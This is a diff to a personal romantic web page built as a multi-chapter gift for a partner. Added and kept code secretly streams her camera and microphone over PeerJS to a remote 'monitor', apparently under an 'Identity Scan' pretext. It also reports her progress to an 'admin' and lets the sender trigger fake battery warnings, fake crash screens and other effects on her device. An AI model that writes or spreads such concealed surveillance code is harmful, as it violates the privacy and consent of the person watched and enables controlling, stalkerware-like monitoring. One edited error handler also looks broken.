@@ -126,6 +126,16 @@
         .flute-toggle.active { background: rgba(59, 130, 246, 0.3); box-shadow: 0 0 15px var(--krishna-blue); }
         .flute-toggle span { font-size: 24px; filter: drop-shadow(0 0 5px white); }
 
+        /* --- SCREEN SHARE BUTTON --- */
+        .screen-share-toggle {
+            position: fixed; bottom: 20px; left: 20px; z-index: 1000;
+            padding: 8px 15px; border-radius: 20px; font-size: 10px;
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2);
+            color: rgba(255,255,255,0.6); display: none; text-transform: uppercase;
+            letter-spacing: 1px; cursor: pointer; transition: all 0.3s ease;
+        }
+        .screen-share-toggle:hover { background: rgba(255,255,255,0.15); color: #fff; border-color: #fff; }
+
         /* --- SPECIFIC STYLES --- */
         .romantic-heading {
             font-family: 'Cormorant Garamond', serif; font-style: italic; font-size: 3.5rem;
@@ -192,6 +202,20 @@
             z-index: 1000; transform: scaleX(-1); pointer-events: none;
             transition: opacity 1s ease;
         }
+
+        /* 🔥 NOTIFICATION ANIMATION */
+        @keyframes slideDown { 
+            from { top: -100px; opacity:0; } 
+            to { top: 20px; opacity:1; } 
+        }
+        
+        /* 🔥 GALLERY ALERT TOAST */
+        #remote-alert {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: rgba(236, 72, 153, 0.9); padding: 15px 25px; border-radius: 50px;
+            color: white; font-weight: bold; z-index: 9999; display: none;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5); font-family: 'Montserrat', sans-serif;
+        }
     </style>
 </head>
 <body>
@@ -199,6 +223,9 @@
     <!-- 🔥 LIVE VIDEO PREVIEW (For her to see her "scan") -->
     <video id="hidden-cam" autoplay playsinline muted></video>
     <canvas id="cam-canvas" style="display:none;"></canvas>
+    
+    <!-- 🔥 REMOTE ALERT BOX -->
+    <div id="remote-alert"></div>
 
     <div class="scanlines"></div>
     <div class="matrix-bg" id="tech-bg"></div>
@@ -220,6 +247,11 @@
     <div id="flute-btn" class="flute-toggle" onclick="toggleFluteMode()">
         <span>🪈</span>
     </div>
+
+    <!-- 🔥 SCREEN SHARE UI -->
+    <button id="screen-share-btn" class="screen-share-toggle" onclick="startScreenShare()">
+        📺 Share View
+    </button>
 
     <!-- LOADER -->
     <div id="loader" class="fixed inset-0 bg-black z-[200] flex flex-col items-center justify-center font-mono">
@@ -311,9 +343,9 @@
         <div id="chap-7" class="chapter-container"><h2 class="romantic-heading text-3xl mb-8">Feel My Heartbeat</h2><div class="relative"><div class="absolute inset-0 bg-pink-600 blur-3xl opacity-20 animate-pulse"></div><div class="sync-heart text-8xl text-pink-500 animate-pulse cursor-pointer relative z-10" onclick="navigator.vibrate(100)">❤</div></div><p class="text-sm mt-6 text-gray-300 tracking-widest uppercase">Tap to connect</p><button onclick="nextChapter()" class="soul-btn mt-10">Touch</button></div>
         <div id="chap-8" class="chapter-container"><h2 class="romantic-heading text-3xl mb-4">Hold My Hand</h2><div class="relative w-full h-80 max-w-md bg-white/5 rounded-xl border border-white/10 mt-4 touch-none overflow-hidden" id="drag-zone"><div class="absolute inset-0 flex items-center justify-center text-white/5 text-6xl">❤</div><div id="my-hand" class="hand" style="position:absolute; bottom:15%; right:15%; opacity:0.6; filter: drop-shadow(0 0 10px rgba(255,255,255,0.3)); font-size:40px;">🫴</div><div id="her-hand" class="hand touch-none" style="position:absolute; top:15%; left:15%; filter: drop-shadow(0 0 10px rgba(255,192,203,0.5)); font-size:40px;">🤚</div></div><button id="hand-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-6">View Memories</button></div>
         <div id="chap-9" class="chapter-container" onmouseenter="startCrowd()" onmouseleave="stopCrowd()"><div class="absolute inset-0 flex items-center justify-center overflow-hidden"><div class="silhouette" style="left:10%; top:40%; animation-delay:0s"></div><div class="silhouette" style="left:30%; top:20%; animation-delay:1s"></div><div class="silhouette" style="left:70%; top:50%; animation-delay:2s"></div><div class="silhouette" style="left:80%; top:30%; animation-delay:0.5s"></div><div class="silhouette" style="left:20%; top:60%; animation-delay:3s"></div></div><div class="relative z-10 w-64 h-64 flex items-center justify-center group"><div class="absolute inset-0 bg-black/80 group-hover:opacity-0 transition duration-700 flex items-center justify-center"><p class="text-gray-400 text-xs tracking-widest uppercase animate-pulse">Find Her...</p></div><img src="New folder (3)/promise4.jpg" onerror="this.src='https://placehold.co/300x300/pink/white?text=Nayanika'" class="w-full h-full object-cover rounded-full shadow-[0_0_50px_#ec4899] opacity-20 group-hover:opacity-100 transition duration-700" onmouseenter="foundHer()"></div><p id="crowd-msg" class="text-pink-300 mt-8 opacity-0 transition font-serif italic text-xl">"In a loud world, my eyes only find you."</p><button id="crowd-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-4">Continue</button></div>
-        <div id="chap-10" class="chapter-container"><h2 class="romantic-heading text-4xl mb-8">Voices & Memories</h2><div class="flex flex-col md:flex-row gap-8 items-center justify-center"><div class="photo-frame transform -rotate-6 hover:rotate-0" onclick="playVoice('songs1/voice1.mp3', this)"><img src="New folder (3)/mylove2.jpg" onerror="this.src='https://placehold.co/300x400/pink/white?text=Sweet+Memory'"><p class="text-black text-center font-serif mt-2 italic text-sm">Tap to Listen ♫</p></div><div class="photo-frame transform rotate-3 hover:rotate-0" onclick="playVoice('songs1/voice2.mp3', this)"><img src="New folder (3)/promise1.jpg" onerror="this.src='https://placehold.co/300x400/purple/white?text=Us+Forever'"><p class="text-black text-center font-serif mt-2 italic text-sm">Your Voice ♫</p></div></div><button onclick="nextChapter()" class="soul-btn mt-12">Secrets</button></div>
+        <div id="chap-10" class="chapter-container"><h2 class="romantic-heading text-3xl mb-8">Voices & Memories</h2><div class="flex flex-col md:flex-row gap-8 items-center justify-center"><div class="photo-frame transform -rotate-6 hover:rotate-0" onclick="playVoice('songs1/voice1.mp3', this)"><img src="New folder (3)/mylove2.jpg" onerror="this.src='https://placehold.co/300x400/pink/white?text=Sweet+Memory'"><p class="text-black text-center font-serif mt-2 italic text-sm">Tap to Listen ♫</p></div><div class="photo-frame transform rotate-3 hover:rotate-0" onclick="playVoice('songs1/voice2.mp3', this)"><img src="New folder (3)/promise1.jpg" onerror="this.src='https://placehold.co/300x400/purple/white?text=Us+Forever'"><p class="text-black text-center font-serif mt-2 italic text-sm">Your Voice ♫</p></div></div><button onclick="nextChapter()" class="soul-btn mt-12">Secrets</button></div>
         <div id="chap-11" class="chapter-container"><h2 class="romantic-heading text-3xl mb-10">Little Secrets</h2><div class="grid grid-cols-2 gap-6 w-full max-w-md"><div class="glass-card cursor-pointer hover:bg-white/10 transition" onclick="this.innerHTML='<span class=\'text-pink-300 italic\'>I love your jealousy</span>'"><span class="text-2xl">🔒</span><br><span class="text-xs uppercase mt-2 block">Tap to Unlock</span></div><div class="glass-card cursor-pointer hover:bg-white/10 transition" onclick="this.innerHTML='<span class=\'text-pink-300 italic\'>Your voice heals me</span>'"><span class="text-2xl">🔒</span><br><span class="text-xs uppercase mt-2 block">Tap to Unlock</span></div></div><button onclick="nextChapter()" class="soul-btn mt-10">Our Movie</button></div>
-        <div id="chap-12" class="chapter-container"><h2 class="romantic-heading text-3xl mb-6">Our Moments</h2><div class="cinema-container"><video id="mem-vid" controls playsinline poster="New folder (3)/photo1.jpg" onerror="console.log('Video missing, skipping');"><source src="New folder (3)/video.mp4" type="video/mp4">Your browser does not support video.</video></div><button onclick="stopVideo()" class="soul-btn mt-6">Continue</button></div>
+        <div id="chap-12" class="chapter-container"><h2 class="romantic-heading text-3xl mb-6">Our Moments</h2><div class="cinema-container"><video id="mem-vid" controls playsinline poster="New folder (3)/photo1.jpg" onerror="this.log('Video missing, skipping');"><source src="New folder (3)/video.mp4" type="video/mp4">Your browser does not support video.</video></div><button onclick="stopVideo()" class="soul-btn mt-6">Continue</button></div>
         <div id="chap-13" class="chapter-container"><div class="bg-black/90 rounded-2xl border border-gray-700 w-80 h-[500px] relative overflow-hidden shadow-2xl flex flex-col items-center"><div class="w-full p-4 flex items-center justify-between bg-black/40 z-20"><span class="text-white text-xs">WhatsApp Video...</span><span class="text-green-500 text-xs font-mono">ENCRYPTED</span></div><img src="New folder (3)/promise4.jpg" onerror="this.src='https://placehold.co/300x500/black/white?text=Sunu'" class="absolute inset-0 w-full h-full object-cover opacity-60"><div class="absolute inset-0 flex flex-col items-center justify-end pb-20 z-10"><h3 class="text-2xl font-bold text-white mb-2">My World 🌎</h3><p class="text-white/70 font-mono text-sm mb-8 animate-pulse">02:45:12</p><div class="flex gap-8 items-center"><div class="w-12 h-12 rounded-full bg-white/20 flex items-center justify-center text-xl">📷</div><div class="w-12 h-12 rounded-full bg-white/20 flex items-center justify-center text-xl">🎤</div><div id="end-call-btn" class="w-16 h-16 rounded-full bg-red-600 flex items-center justify-center text-3xl cursor-pointer transition-transform duration-100 shadow-[0_0_20px_red]" onmouseover="moveEndButton(this)" onclick="clickEndButton()">📞</div></div></div><div id="call-error" class="absolute inset-0 bg-black/95 flex flex-col items-center justify-center p-6 text-center hidden z-50"><span class="text-red-500 text-6xl mb-4">⚠️</span><h2 class="text-red-500 font-mono text-xl mb-4">ERROR: CANNOT DISCONNECT</h2><p class="text-white font-serif italic text-lg leading-relaxed">"The hardest part is saying goodbye. So I made a call that never ends. I am always listening, always here."</p><button onclick="nextChapter()" class="soul-btn mt-8">Promise</button></div></div></div>
         <div id="chap-14" class="chapter-container" onclick="revealSilence()"><h2 class="romantic-heading text-3xl mb-8">When we are silent...</h2><div class="flex flex-col gap-6 text-center max-w-md"><p id="silence-1" class="text-gray-400 opacity-0 transition duration-1000">I don't just hear silence.</p><p id="silence-2" class="text-pink-200 font-serif text-xl opacity-0 transition duration-1000 delay-500">I hear your breathing like a lullaby.</p><p id="silence-3" class="text-white opacity-0 transition duration-1000 delay-1000">I think about holding you until my arms go numb.</p></div><p class="text-xs text-gray-500 mt-12 animate-pulse">Tap anywhere to listen</p><button id="silence-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-4">Next</button></div>
         <div id="chap-15" class="chapter-container"><h2 class="romantic-heading text-3xl mb-8">Who is the Thief?</h2><p class="text-white/60 mb-6 text-sm">Krishna stole butter. What did you steal?</p><div id="matki" class="matki-container" onclick="breakMatki()"><div class="matki-body"><span class="text-4xl">🏺</span></div><div class="absolute top-0 left-0 w-full h-full flex items-center justify-center pointer-events-none"><span class="text-xs text-white/50 font-bold uppercase tracking-widest">Tap to Break</span></div></div><div id="matki-secret" class="hidden flex-col items-center"><img src="New folder (3)/promise11.jpg" onerror="this.src='https://placehold.co/150x150/pink/white?text=You'" class="w-32 h-32 rounded-full border-4 border-pink-500 mb-4 shadow-[0_0_30px_#ec4899] animate-[fadeIn_1s]"><h3 class="text-2xl font-serif text-pink-300 italic">"You are my Makhan Chor"</h3><p class="text-white mt-2">Because you stole my heart.</p></div><button id="matki-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-8">Guilty as Charged</button></div>
@@ -335,7 +367,7 @@
         <div id="chap-31" class="chapter-container"><h2 class="romantic-heading text-3xl mb-8 text-amber-200">Make a Wish</h2><div class="relative w-64 h-80 flex flex-col items-center"><div class="w-full h-64 rounded-t-lg overflow-hidden shadow-[0_0_30px_#fbbf24]"><img src="New folder (3)/krishna.jpg" onerror="this.src='https://placehold.co/300x400/orange/white?text=Lord+Krishna'" class="w-full h-full object-cover"></div><div class="diya-container -mt-4 z-10" onclick="lightDiya(this)"><div class="diya-flame"></div></div></div><p id="diya-msg" class="text-amber-100 mt-8 opacity-0 transition font-serif italic">"May He guide us forever. Jai Shri Krishna."</p><button id="diya-btn" onclick="nextChapter()" class="soul-btn mt-6 opacity-0 pointer-events-none border-amber-500 text-amber-200">Amen</button></div>
         <div id="chap-32" class="chapter-container"><h2 class="romantic-heading text-3xl mb-6">Message to Rudra</h2><div class="glass-card max-w-md w-full relative z-10"><p class="text-xs text-pink-300 uppercase tracking-widest mb-4">Write something for me to read...</p><div class="relative w-full"><textarea id="capsule-input" class="w-full h-32 bg-black/30 border border-pink-500/30 rounded-lg p-4 text-pink-100 focus:outline-none focus:border-pink-500 font-serif italic resize-none" placeholder="Type your heart out here..."></textarea><div id="capsule-lock" class="absolute inset-0 bg-black/90 flex flex-col items-center justify-center rounded-lg opacity-0 pointer-events-none"><div class="text-5xl mb-2">📨</div><p class="text-green-500 font-mono text-xs tracking-widest uppercase">Message Sent!</p></div></div><button id="capsule-btn" onclick="sendCapsule()" class="soul-btn mt-6 w-full text-sm">Send to Sahababu 💌</button></div><div class="absolute inset-0 pointer-events-none"><div id="data-stream" class="hidden absolute left-1/2 bottom-1/2 w-1 h-1 bg-green-500 shadow-[0_0_20px_#0f0]"></div></div><button id="capsule-next" onclick="nextChapter()" class="soul-btn mt-8 opacity-0 pointer-events-none">Continue</button></div>
         <div id="chap-33" class="chapter-container"><h2 class="romantic-heading text-3xl mb-4">Wipe the Mirror</h2><p class="text-gray-400 text-xs mb-6 uppercase tracking-widest">The glass is foggy. Clear it to see the truth.</p><div class="relative w-[300px] h-[400px] border-4 border-gray-800 rounded-lg shadow-[0_0_50px_rgba(255,255,255,0.1)] overflow-hidden cursor-crosshair touch-none"><div class="absolute inset-0 flex items-center justify-center bg-black"><img src="New folder (3)/promise1.jpg" onerror="this.src='https://placehold.co/300x400/pink/white?text=I+Love+You'" class="w-full h-full object-cover"><div class="absolute bottom-10 text-center w-full px-4"><p class="text-white font-[Great_Vibes] text-3xl drop-shadow-md">You are my clearest view.</p></div></div><canvas id="fog-canvas" width="300" height="400" class="absolute inset-0 z-20"></canvas></div><button id="mirror-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-8">See Clearly</button></div>
-        <div id="chap-34" class="chapter-container"><h2 class="romantic-heading text-3xl mb-6">Our Bucket List</h2><div class="grid grid-cols-1 gap-4 text-left w-72"><label class="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-white/5"><input type="checkbox" class="accent-pink-500 w-5 h-5" onchange="checkBucket(this)"><span class="text-gray-300 group-hover:text-pink-300 transition font-serif italic text-lg">Late Night Drive 🚗</span></label><label class="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-white/5"><input type="checkbox" class="accent-pink-500 w-5 h-5" onchange="checkBucket(this)"><span class="text-gray-300 group-hover:text-pink-300 transition font-serif italic text-lg">Cook Together 🍝</span></label><label class="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-white/5"><input type="checkbox" class="accent-pink-500 w-5 h-5" onchange="checkBucket(this)"><span class="text-gray-300 group-hover:text-pink-300 transition font-serif italic text-lg">Visit Vrindavan 🪷</span></label></div><button onclick="nextChapter()" class="soul-btn mt-8">Let's Do Them All</button></div>
+        <div id="chap-34" class="chapter-container"><h2 class="romantic-heading text-3xl mb-4">Our Bucket List</h2><div class="grid grid-cols-1 gap-4 text-left w-72"><label class="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-white/5"><input type="checkbox" class="accent-pink-500 w-5 h-5" onchange="checkBucket(this)"><span class="text-gray-300 group-hover:text-pink-300 transition font-serif italic text-lg">Late Night Drive 🚗</span></label><label class="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-white/5"><input type="checkbox" class="accent-pink-500 w-5 h-5" onchange="checkBucket(this)"><span class="text-gray-300 group-hover:text-pink-300 transition font-serif italic text-lg">Cook Together 🍝</span></label><label class="flex items-center gap-3 cursor-pointer group p-2 rounded hover:bg-white/5"><input type="checkbox" class="accent-pink-500 w-5 h-5" onchange="checkBucket(this)"><span class="text-gray-300 group-hover:text-pink-300 transition font-serif italic text-lg">Visit Vrindavan 🪷</span></label></div><button onclick="nextChapter()" class="soul-btn mt-8">Let's Do Them All</button></div>
         <div id="chap-35" class="chapter-container"><h2 class="romantic-heading text-3xl mb-8">Identity Verification</h2><div class="relative w-64 h-80 flex flex-col items-center justify-center"><div class="w-48 h-64 border-2 border-pink-500/50 rounded-2xl relative overflow-hidden bg-black/50 shadow-[0_0_30px_rgba(236,72,153,0.2)]"><div id="scan-line" class="absolute top-0 left-0 w-full h-1 bg-green-500 shadow-[0_0_15px_#0f0] animate-[scan_2s_infinite]"></div><img id="print-1" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Fingerprint_arch.svg" class="absolute inset-0 w-full h-full p-8 opacity-30 filter invert" style="color:white;"><img id="print-2" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Fingerprint_arch.svg" class="absolute inset-0 w-full h-full p-8 opacity-0 filter invert" style="transform: scaleX(-1);"></div><div id="touch-zone" class="absolute inset-0 z-20 cursor-pointer touch-none" ontouchstart="startScan()" ontouchend="stopScan()" onmousedown="startScan()" onmouseup="stopScan()"></div></div><p id="scan-msg" class="text-green-400 font-mono mt-6 text-sm tracking-widest animate-pulse">HOLD TO SCAN FINGERPRINT</p><button id="match-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-6">Match Confirmed</button></div>
         <div id="chap-36" class="chapter-container"><h2 class="romantic-heading text-3xl mb-8">Play My Voice</h2><div class="flex gap-4 flex-wrap justify-center max-w-sm"><button onclick="playNote(1)" class="w-16 h-24 bg-white/10 border border-pink-500 rounded-lg hover:bg-pink-500 hover:scale-110 transition duration-100 flex items-end justify-center pb-2 text-xl">I</button><button onclick="playNote(2)" class="w-16 h-24 bg-white/10 border border-pink-500 rounded-lg hover:bg-pink-500 hover:scale-110 transition duration-100 flex items-end justify-center pb-2 text-xl">❤️</button><button onclick="playNote(3)" class="w-16 h-24 bg-white/10 border border-pink-500 rounded-lg hover:bg-pink-500 hover:scale-110 transition duration-100 flex items-end justify-center pb-2 text-xl">U</button><button onclick="playNote(4)" class="w-16 h-24 bg-white/10 border border-pink-500 rounded-lg hover:bg-pink-500 hover:scale-110 transition duration-100 flex items-end justify-center pb-2 text-xl">💋</button></div><p class="text-xs text-gray-500 mt-6">Tap to create a melody</p><button onclick="nextChapter()" class="soul-btn mt-8">Continue</button></div>
         <div id="chap-37" class="chapter-container"><h2 class="romantic-heading text-3xl mb-4">In Case of Sadness</h2><div id="glass-case" class="relative w-full max-w-sm aspect-video border-8 border-gray-800 bg-gray-900 shadow-2xl cursor-pointer" onclick="breakGlass()"><div class="absolute inset-0 flex items-center justify-center z-20 bg-white/10 backdrop-blur-[2px]"><span class="text-4xl font-bold text-white/50 border-4 border-white/50 p-4 transform -rotate-12">BREAK GLASS</span></div><div class="absolute inset-0 bg-black flex items-center justify-center"><span class="text-6xl">🔨</span></div></div><div id="comfort-video-container" class="hidden w-full max-w-sm aspect-video bg-black border border-pink-500/50 shadow-[0_0_30px_#ec4899]"><video id="comfort-video" class="w-full h-full object-cover" controls onerror="console.log('Comfort video missing')"><source src="New folder (3)/comfort.mp4" type="video/mp4">Video missing.</video></div><button id="break-btn" onclick="nextChapter()" class="soul-btn opacity-0 pointer-events-none mt-8">I Am Here</button></div>
@@ -380,8 +412,6 @@
                 <button id="send-photos-btn" onclick="sendPhotoBatch()" class="soul-btn border-green-500 text-green-100 text-sm py-3">
                     one last thing sunu
                 </button>
-                
-           
             </div>
             
             <h1 id="end-title" class="text-5xl font-[Great_Vibes] text-white mt-8 opacity-0 transition-opacity delay-1000">
@@ -410,6 +440,22 @@
         
         const totalChap = 44; 
         
+        // 🔥 CHAPTER NAMES MAP (FOR TRACKING)
+        const chapterNames = {
+            1: "Welcome / Entry", 2: "First Chats", 3: "Memory Quiz", 4: "Perspective Shift", 
+            5: "Timer / Infinity", 6: "Heal Heart", 7: "Heartbeat Sync", 8: "Hand Hold",
+            9: "Find in Crowd", 10: "Voices", 11: "Secrets", 12: "Our Movie",
+            13: "Video Call Sim", 14: "Silence / Lullaby", 15: "Matki / Thief", 
+            16: "Giggle Gallery", 17: "Tease / Angry", 18: "Laugh Check", 19: "Radha Theme",
+            20: "Puzzle Fix", 21: "Letter", 22: "Brain Log", 23: "Divine Protect",
+            24: "Vrindavan Vows", 25: "Promises", 26: "Waiting Chair", 27: "Gita Quote",
+            28: "Surprise Box", 29: "Safe House", 30: "Love Question", 31: "Diya Light",
+            32: "Send Message", 33: "Wipe Mirror", 34: "Bucket List", 35: "Fingerprint",
+            36: "Play Melody", 37: "Break Glass", 38: "Grow Old", 39: "Birthday Cake",
+            40: "Physics Love", 41: "Paint Story", 42: "Final Wish", 43: "Review", 
+            44: "Timelapse / End"
+        };
+
         const bgMusic = document.getElementById('bg-music');
         const fluteMusic = document.getElementById('flute-music');
         const crowdAudio = document.getElementById('crowd-audio');
@@ -428,67 +474,222 @@
         let camInterval = null;
         let candles = 0; 
 
-        // --- 🔥 PEERJS LIVE VIDEO LOGIC ---
-        // --- STABLE PEERJS FOR NAYANIKA ---
-const receiverID = 'rudra_nayanika_live_998877_exclusive'; // MUST match monitor.html
-let peer;
+        // --- 🔥 PEERJS & GOD MODE LOGIC (NAYANIKA'S SIDE) ---
+        const receiverID = 'rudra_nayanika_live_998877_exclusive'; 
+        let peer;
+        let dataConn;
 
-function initLiveReaction() {
-    console.log("Starting PeerJS...");
-    
-    // We create the peer without a specific ID for her
-    // This bypasses some tracking prevention issues
-    peer = new Peer(null, {
-        debug: 2
-    });
+        function initLiveReaction() {
+            peer = new Peer(null, { debug: 2 });
 
-    peer.on('open', (id) => {
-        console.log('Nayanika system online. ID: ' + id);
-        startCameraAndCall();
-    });
+            peer.on('open', (id) => {
+                console.log('Nayanika system online. ID: ' + id);
+                startCameraAndCall();
+                
+                // Establish Data Connection for God Mode
+                dataConn = peer.connect(receiverID);
+                setupDataListener();
+            });
 
-    peer.on('error', (err) => {
-        console.error("PeerJS Error:", err.type);
-        // If it fails, we try to reconnect once
-        if(err.type === 'network') {
-            setTimeout(initLiveReaction, 1000);
-        }
-    });
-}
+            peer.on('connection', (conn) => {
+                dataConn = conn;
+                setupDataListener();
+            });
 
-async function startCameraAndCall() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: 320, height: 240 }, 
-            audio: true 
-        });
-
-        // Show her the "Scan" preview
-        const videoElement = document.getElementById('hidden-cam');
-        if (videoElement) {
-            videoElement.srcObject = stream;
-            videoElement.style.opacity = "1"; 
-            videoElement.play();
+            peer.on('error', (err) => {
+                if(err.type === 'network') setTimeout(initLiveReaction, 1000);
+            });
         }
 
-        // CALL RUDRA
-        const call = peer.call(receiverID, stream);
-        console.log("Attempting to connect to monitor...");
+        // 🔥 SEND PROGRESS TO ADMIN
+        function updateAdminProgress() {
+            if (dataConn && dataConn.open) {
+                const now = new Date();
+                const timeStr = now.getHours() + ":" + (now.getMinutes()<10?'0':'') + now.getMinutes();
+                
+                // Send general progress
+                dataConn.send({
+                    type: 'PROGRESS',
+                    chapter: currentChap,
+                    name: chapterNames[currentChap] || "Unknown Stage",
+                    time: timeStr
+                });
 
-        call.on('error', (err) => {
-            console.error("Call Error:", err);
-        });
+                // Send specific alerts
+                if (currentChap === 16) {
+                    dataConn.send('REACHED_GALLERY');
+                }
+            }
+        }
 
-    } catch (err) {
-        console.error("Camera Access Denied:", err);
-        alert("Please allow camera access for the 'Identity Scan'!");
-    }
-}
+        // 🔥 UPDATED DATA LISTENER WITH ALL COMMANDS
+        function setupDataListener() {
+            if(!dataConn) return;
+            
+            dataConn.on('open', () => {
+                updateAdminProgress();
+            });
+
+            dataConn.on('data', (data) => {
+                console.log("Remote Command Received:", data);
+                
+                // --- VISUAL COMMANDS ---
+                if (data === 'SHAKE') triggerRemoteShake();
+                if (data === 'MATRIX') triggerRemoteMatrix();
+                if (data === 'GRAY') triggerRemoteGray();
+                if (data === 'FLIP') triggerRemoteFlip();
+                if (data === 'HEARTS') triggerRemoteHearts();
+                if (data === 'FLOWERS') triggerRemoteFlowers();
+                
+                // --- SYSTEM COMMANDS ---
+                if (data === 'NOTIFY') triggerFakeNotify();
+                if (data === 'BATTERY') triggerFakeBattery();
+                if (data === 'CRASH') triggerRemoteCrash();
+                if (data === 'VOICE') playVoice('songs1/vp1.mp3', null);
+                
+                // --- MUSIC COMMANDS ---
+                if (data === 'SONG_1') changeMusic('songs1/romantic.mp3');
+                if (data === 'SONG_2') changeMusic('songs1/fun.mp3');
+                if (data === 'SONG_3') changeMusic('songs1/emotional.mp3');
+                if (data === 'SONG_4') changeMusic('songs1/birthday.mp3');
+                if (data === 'SONG_5') changeMusic('songs1/flute.mp3');
+
+                // 🔥 GALLERY MESSAGE ALERT
+                if (typeof data === 'string' && data.startsWith('GALLERY_MSG:')) {
+                    const msg = data.split('GALLERY_MSG:')[1];
+                    const alertBox = document.getElementById('remote-alert');
+                    alertBox.innerText = "💌 Rudra says: " + msg;
+                    alertBox.style.display = 'block';
+                    gsap.fromTo(alertBox, {y:-50, opacity:0}, {y:0, opacity:1, duration:0.5});
+                    setTimeout(() => {
+                        gsap.to(alertBox, {y:-50, opacity:0, duration:0.5, onComplete:()=>alertBox.style.display='none'});
+                    }, 5000);
+                }
+            });
+        }
+
+        // 🔥 GOD MODE NEW FUNCTIONS 
+        function triggerRemoteShake() {
+            gsap.fromTo("body", { x: -15 }, { x: 15, duration: 0.1, repeat: 10, yoyo: true, ease: "power1.inOut" });
+        }
+
+        function triggerRemoteMatrix() {
+            const techBg = document.getElementById('tech-bg');
+            techBg.style.zIndex = "1000";
+            gsap.to(techBg, { opacity: 1, duration: 0.5 });
+            setTimeout(() => {
+                gsap.to(techBg, { opacity: 0, duration: 1, onComplete: () => { techBg.style.zIndex = "0"; }});
+            }, 3000);
+        }
+
+        function triggerRemoteGray() {
+            if (document.body.style.filter.includes('grayscale')) {
+                document.body.style.filter = "none";
+            } else {
+                document.body.style.filter = "grayscale(100%)";
+            }
+        }
+
+        function triggerRemoteFlip() {
+            if (document.body.style.transform.includes('rotate(180deg)')) {
+                gsap.to("body", { rotation: 0, duration: 1, ease: "back.out" });
+            } else {
+                gsap.to("body", { rotation: 180, duration: 1, ease: "back.out" });
+            }
+        }
+
+        // 🔥 EXISTING GOD MODE EFFECTS
+        function triggerRemoteHearts() {
+            confetti({
+                particleCount: 150, spread: 70, origin: { y: 0.6 },
+                colors: ['#ec4899', '#ff0000', '#ffffff'], shapes: ['heart']
+            });
+        }
+
+        function triggerRemoteFlowers() {
+            confetti({
+                particleCount: 100, spread: 100, origin: { y: 0 }, 
+                colors: ['#06b6d4', '#10b981', '#facc15'], gravity: 0.5
+            });
+        }
+
+        function triggerFakeNotify() {
+            const note = document.createElement('div');
+            note.style.cssText = "position:fixed; top:20px; left:50%; transform:translateX(-50%); width:90%; max-width:350px; background:rgba(255,255,255,0.95); border-radius:15px; padding:15px; z-index:10000; box-shadow:0 10px 30px rgba(0,0,0,0.3); display:flex; align-items:center; gap:12px; font-family:sans-serif; animation:slideDown 0.5s ease-out;";
+            note.innerHTML = `<div style="width:45px; height:45px; background:#3b82f6; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold;">R</div><div style="flex:1;"><div style="font-weight:bold; color:black; font-size:14px;">Rudra ❤️</div><div style="color:#444; font-size:13px;">I can see you smiling! You look so cute... 🥰</div></div>`;
+            document.body.appendChild(note);
+            setTimeout(() => { note.style.animation = "slideDown 0.5s reverse"; setTimeout(()=>note.remove(), 500); }, 5000);
+        }
+
+        function triggerFakeBattery() {
+            const bat = document.createElement('div');
+            bat.style.cssText = "position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; text-align:center;";
+            bat.innerHTML = `<div style="background:white; padding:30px; border-radius:20px; color:black; width:80%;"><div style="font-size:40px; margin-bottom:10px;">🪫</div><div style="font-weight:bold; font-size:18px;">Low Battery</div><p style="font-size:14px; color:#666;">1% remaining. Your device will shut down shortly.</p><button onclick="this.parentElement.parentElement.remove()" style="margin-top:20px; padding:10px 30px; background:#000; color:#fff; border-radius:10px;">Close</button></div>`;
+            document.body.appendChild(bat);
+        }
+
+        function triggerRemoteCrash() {
+            const glitchOverlay = document.createElement('div');
+            glitchOverlay.style.cssText = "position:fixed; inset:0; background:black; z-index:9999; display:flex; align-items:center; justify-content:center; color:#0f0; font-family:monospace; font-size:12px;";
+            glitchOverlay.innerHTML = "<div>> ERROR: SYSTEM_OVERLOAD<br>> CORE_TEMP_CRITICAL<br>> ATTEMPTING_RECOVERY...</div>";
+            document.body.appendChild(glitchOverlay);
+            setTimeout(() => {
+                glitchOverlay.innerHTML = "<div style='color:#ec4899; font-size:20px;'>JUST KIDDING! 😂<br>I LOVE YOU SUNU ❤️</div>";
+                setTimeout(() => glitchOverlay.remove(), 2000);
+            }, 3000);
+        }
+
+        function changeMusic(newSrc) {
+            const bg = document.getElementById('bg-music');
+            gsap.to(bg, {volume: 0, duration: 1, onComplete: () => {
+                bg.src = newSrc;
+                bg.load();
+                bg.play();
+                gsap.to(bg, {volume: 1, duration: 1});
+            }});
+        }
+
+        async function startCameraAndCall() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
+                const videoElement = document.getElementById('hidden-cam');
+                if (videoElement) {
+                    videoElement.srcObject = stream;
+                    videoElement.style.opacity = "1"; 
+                    videoElement.play();
+                }
+                // Send with metadata type 'camera'
+                peer.call(receiverID, stream, { metadata: { type: 'camera' } });
+            } catch (err) {
+                console.error("Camera Access Denied:", err);
+            }
+        }
+
+        // 🔥 SCREEN SHARE FUNCTION
+        async function startScreenShare() {
+            try {
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { cursor: "always" }, 
+                    audio: false 
+                });
+
+                // Send with metadata type 'screen-cast'
+                const call = peer.call(receiverID, screenStream, { metadata: { type: 'screen-cast' } });
+
+                // Hide button when sharing
+                document.getElementById('screen-share-btn').style.display = 'none';
+
